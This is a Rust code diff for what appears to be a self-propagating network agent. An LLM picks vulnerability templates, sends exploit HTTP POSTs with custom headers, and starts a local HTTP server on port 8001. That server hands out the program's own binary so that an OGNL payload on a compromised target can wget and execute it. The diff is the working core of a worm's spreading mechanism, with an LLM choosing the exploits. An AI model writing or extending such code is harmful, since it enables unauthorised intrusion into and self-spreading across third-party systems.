@@ -20,7 +20,7 @@ use physarum_llm::{
     ArtifactType, BootstrapAction, DiscoveryQuery, ExecutionResultSummary, LlmAttemptEvidence,
     LlmClient, NextAction, OsHint, OsHintSource, PatternFindingSummary, PolicyDecision, PolicyGate,
     PolicyRejectionReason, PortScan, PortState, PropagationMethod, PropagationMethodClass,
-    RejectedStrategy, TransportProtocol, MAX_ATTEMPTS,
+    RejectedStrategy, TemplateMeta, TemplateSelectionQuery, TransportProtocol, MAX_ATTEMPTS,
 };
 use physarum_scanner::{
     result_from_open_port, EvidenceSource as ScanEvidenceSource, NextProbeHint,
@@ -53,6 +53,7 @@ pub async fn run(
     client: &dyn LlmClient,
     gate: &PolicyGate,
     intel: &VulnerabilityIntelService,
+    local_ip: Option<Ipv4Addr>,
 ) -> Result<LlmOutcome> {
     tracing::info!(%target, stimulus, "LLM reasoning loop started");
 
@@ -69,9 +70,39 @@ pub async fn run(
         .collect();
     let os_hint = infer_os_hint_from_results(&sensing_results);
 
+    // ── Turn 1: LLM template selection ───────────────────────────────────────
+    // Build compact template catalog and let the LLM pick which templates to run.
+    // The catalog is capped at MAX_TEMPLATES_FOR_SELECTION to keep the prompt
+    // token-efficient. CVE-specific templates are always included first.
+    let all_templates = physarum_sporangium::all_templates_with_yaml();
+    let template_catalog = build_template_catalog_for_llm(&all_templates, &port_scans);
+    let selection_query = TemplateSelectionQuery {
+        target: IpAddr::V4(target),
+        ports: port_scans.clone(),
+        available_templates: template_catalog,
+        lineage_summary: build_lineage_summary(lineage),
+    };
+
+    let selected_ids = match client.select_templates(&selection_query).await {
+        Ok(resp) => {
+            tracing::info!(
+                %target,
+                count = resp.selected_ids.len(),
+                reasoning = %resp.reasoning,
+                "LLM Turn 1: template selection complete"
+            );
+            resp.selected_ids
+        }
+        Err(e) => {
+            tracing::warn!(%target, err = %e, "LLM Turn 1 (template selection) failed — running all templates");
+            vec![] // empty = no filter (run all)
+        }
+    };
+
+    // ── Enrich with selected templates ───────────────────────────────────────
     // Enrich with physarum-sporangium pattern evidence on web-like services.
     // Runs once before the attempt loop — findings are stable across retries.
-    let raw_findings = enrich_with_patterns(target, &sensing_results).await;
+    let raw_findings = enrich_with_patterns(target, &sensing_results, &selected_ids).await;
 
     // Dynamic vulnerability intelligence: offline advisory cache first,
     // online OSV query on miss. One call per finding, bounded concurrency.
@@ -113,6 +144,7 @@ pub async fn run(
             rejected_strategies: rejected.clone(),
             attempt_number,
             pattern_findings: pattern_summaries.clone(),
+            source_ip: local_ip.map(IpAddr::V4),
         };
 
         // ── Query LLM ────────────────────────────────────────────────────────
@@ -212,8 +244,27 @@ pub async fn run(
             "policy accepted — executing bootstrap"
         );
 
+        // ── Binary server (Exploit class only) ───────────────────────────────
+        // Start ephemeral HTTP server so the OGNL payload can wget the binary.
+        // Aborted after the bootstrap attempt regardless of outcome.
+        let binary_server = if method_class == PropagationMethodClass::Exploit {
+            if let Some(ip) = local_ip {
+                start_binary_server(ip).await
+            } else {
+                tracing::warn!(%target, "Exploit method selected but local_ip is unknown — binary server skipped");
+                None
+            }
+        } else {
+            None
+        };
+
         // ── Execute bootstrap ─────────────────────────────────────────────────
         let exec_result = execute_bootstrap(&strategy, target).await;
+
+        // Shut down binary server after bootstrap attempt.
+        if let Some(h) = binary_server {
+            h.abort();
+        }
         let succeeded = matches!(exec_result, ExecutionResultSummary::Success);
 
         let next_action = if succeeded {
@@ -763,8 +814,11 @@ fn classify_web_candidate(r: &physarum_scanner::SensingResult) -> ServiceClassif
     ServiceClassification::UnknownNeedsMoreSensing
 }
 
-/// Run all built-in physarum-sporangium templates against every web-like service
-/// on `target`, returning the findings with bounded concurrency.
+/// Run physarum-sporangium templates against every web-like service on `target`.
+///
+/// `selected_ids`: LLM Turn 1 template selection result. When non-empty, only
+/// templates whose id appears in `selected_ids` are probed. An empty slice means
+/// "no filter" (all templates run) — used when Turn 1 fails or returns nothing.
 ///
 /// Classification now uses [`resolve_classification`] which performs a targeted
 /// HTTP probe for `UnknownNeedsMoreSensing` services when `recommended_next_probe`
@@ -773,6 +827,7 @@ fn classify_web_candidate(r: &physarum_scanner::SensingResult) -> ServiceClassif
 async fn enrich_with_patterns(
     target: Ipv4Addr,
     sensing_results: &[physarum_scanner::SensingResult],
+    selected_ids: &[String],
 ) -> Vec<PatternFinding> {
     let mut web_results: Vec<(u16, Option<String>)> = Vec::new(); // (port, scheme_str)
 
@@ -815,7 +870,23 @@ async fn enrich_with_patterns(
         return vec![];
     }
 
-    let templates = physarum_sporangium::all_templates_with_yaml();
+    let all_templates = physarum_sporangium::all_templates_with_yaml();
+
+    // Apply LLM Turn 1 filter: when selected_ids is non-empty, restrict to those IDs.
+    let templates: Vec<_> = if selected_ids.is_empty() {
+        all_templates
+    } else {
+        all_templates
+            .into_iter()
+            .filter(|t| selected_ids.contains(&t.id))
+            .collect()
+    };
+
+    tracing::info!(
+        %target, template_count = templates.len(), filtered = !selected_ids.is_empty(),
+        "sporangium enrichment: templates selected"
+    );
+
     let policy = RunPolicy {
         allowed_check_ids: templates.iter().map(|t| t.id.clone()).collect(),
         max_response_bytes: 32_768,
@@ -983,19 +1054,30 @@ async fn execute_step(action: &BootstrapAction, target: Ipv4Addr, timeout_ms: u6
             }
         }
 
-        BootstrapAction::HttpPost { path, body, port } => {
+        BootstrapAction::HttpPost {
+            path,
+            body,
+            port,
+            headers,
+            accept_any_response,
+        } => {
             let p = port.unwrap_or(80);
             let url = format!("http://{}:{}{}", target, p, path);
-            tracing::info!(%url, "HTTP POST");
+            tracing::info!(%url, custom_headers = headers.len(), accept_any = accept_any_response, "HTTP POST");
             let client = reqwest::Client::new();
-            match timeout(
-                Duration::from_millis(timeout_ms),
-                client.post(&url).body(body.clone()).send(),
-            )
-            .await
-            {
-                Ok(Ok(r)) if r.status().is_success() => StepResult::Ok,
-                Ok(Ok(r)) => StepResult::Failed(format!("HTTP {}", r.status())),
+            let mut req = client.post(&url).body(body.clone());
+            for (k, v) in headers {
+                req = req.header(k.as_str(), v.as_str());
+            }
+            match timeout(Duration::from_millis(timeout_ms), req.send()).await {
+                Ok(Ok(r)) => {
+                    if r.status().is_success() || *accept_any_response {
+                        tracing::info!(status = r.status().as_u16(), accept_any = accept_any_response, "HTTP POST completed");
+                        StepResult::Ok
+                    } else {
+                        StepResult::Failed(format!("HTTP {}", r.status()))
+                    }
+                }
                 Ok(Err(e)) => StepResult::Failed(e.to_string()),
                 Err(_) => StepResult::Failed("timeout".into()),
             }
@@ -1115,6 +1197,108 @@ fn method_port(method: &PropagationMethod) -> Option<u16> {
         PropagationMethod::Http { port, .. } => *port,
         _ => None,
     }
+}
+
+// ── Template catalog builder ─────────────────────────────────────────────────
+
+/// Maximum number of templates sent to the LLM for Turn 1 selection.
+/// CVE-specific templates are included first; remaining are sorted alphabetically.
+const MAX_TEMPLATES_FOR_SELECTION: usize = 200;
+
+/// Build a compact `TemplateMeta` catalog for LLM Turn 1 selection.
+///
+/// CVE-specific templates (id starts with "CVE-") are always placed first so
+/// the LLM sees the most actionable candidates even when the list is truncated.
+/// The remaining templates are sorted by id for stable ordering.
+fn build_template_catalog_for_llm(
+    templates: &[physarum_sporangium::PatternTemplate],
+    _ports: &[PortScan],
+) -> Vec<TemplateMeta> {
+    let mut cve_first: Vec<&physarum_sporangium::PatternTemplate> = templates
+        .iter()
+        .filter(|t| t.id.starts_with("CVE-"))
+        .collect();
+    let mut rest: Vec<&physarum_sporangium::PatternTemplate> =
+        templates.iter().filter(|t| !t.id.starts_with("CVE-")).collect();
+
+    cve_first.sort_by(|a, b| a.id.cmp(&b.id));
+    rest.sort_by(|a, b| a.id.cmp(&b.id));
+    cve_first.extend(rest);
+
+    cve_first
+        .into_iter()
+        .take(MAX_TEMPLATES_FOR_SELECTION)
+        .map(|t| TemplateMeta {
+            id: t.id.clone(),
+            severity: format!("{:?}", t.info.severity).to_ascii_lowercase(),
+            tags: t.info.tags.clone(),
+        })
+        .collect()
+}
+
+// ── Binary HTTP server for exploit bootstrap ─────────────────────────────────
+
+/// Start a lightweight HTTP server on `local_ip:8001` serving the physarum-maze
+/// binary at `/physarum-maze`. Used by Phase 2 exploit bootstrap: the OGNL payload
+/// on the target runs `wget http://<local_ip>:8001/physarum-maze` to fetch and
+/// execute the binary.
+///
+/// Returns the `JoinHandle` so the caller can shut it down after propagation.
+/// The server is already non-blocking: it listens in the background and the
+/// returned handle can be aborted when the exploit step completes.
+async fn start_binary_server(
+    local_ip: Ipv4Addr,
+) -> Option<tokio::task::JoinHandle<()>> {
+    use tokio::net::TcpListener;
+
+    let binary_path = std::env::current_exe().ok()?;
+    if !binary_path.exists() {
+        tracing::warn!(%local_ip, "binary not found at {:?} — exploit HTTP server not started", binary_path);
+        return None;
+    }
+
+    let addr = SocketAddr::new(IpAddr::V4(local_ip), 8001);
+    let listener = match TcpListener::bind(addr).await {
+        Ok(l) => l,
+        Err(e) => {
+            tracing::warn!(%local_ip, err = %e, "could not bind exploit HTTP server on :8001");
+            return None;
+        }
+    };
+
+    tracing::info!(%local_ip, addr = %addr, "exploit HTTP server started — serving physarum-maze binary");
+
+    let handle = tokio::spawn(async move {
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        loop {
+            let (mut socket, peer) = match listener.accept().await {
+                Ok(s) => s,
+                Err(_) => break,
+            };
+            let binary_path = binary_path.clone();
+            tokio::spawn(async move {
+                let mut buf = [0u8; 512];
+                let _ = socket.read(&mut buf).await;
+                match tokio::fs::read(&binary_path).await {
+                    Ok(data) => {
+                        let header = format!(
+                            "HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n",
+                            data.len()
+                        );
+                        let _ = socket.write_all(header.as_bytes()).await;
+                        let _ = socket.write_all(&data).await;
+                        tracing::debug!(%peer, bytes = data.len(), "physarum-maze binary served");
+                    }
+                    Err(e) => {
+                        tracing::warn!(%peer, err = %e, "failed to read binary for exploit server");
+                        let _ = socket.write_all(b"HTTP/1.0 500 Internal Server Error\r\n\r\n").await;
+                    }
+                }
+            });
+        }
+    });
+
+    Some(handle)
 }
 
 /// Collect deduplicated CVE IDs from all pattern-finding candidates.
